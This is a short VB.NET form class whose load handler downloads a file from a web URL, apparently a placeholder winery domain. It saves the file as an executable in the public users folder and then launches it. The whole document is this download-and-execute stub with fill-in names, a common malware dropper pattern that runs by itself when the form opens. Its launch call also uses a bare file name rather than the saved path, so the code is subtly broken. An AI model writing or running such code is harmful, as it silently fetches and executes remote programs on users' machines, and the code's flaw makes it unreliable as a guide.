Public Class mainForm

    Private Sub mainForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'Download executable
        My.Computer.Network.DownloadFile(
       "http://www.cohowinery.com/downloads/WineList.txt",
       "C:\Users\Public\yourexename.exe")

        'Execute Downloaded File
        Process.Start("yourexename.exe")
    End Sub

End Class
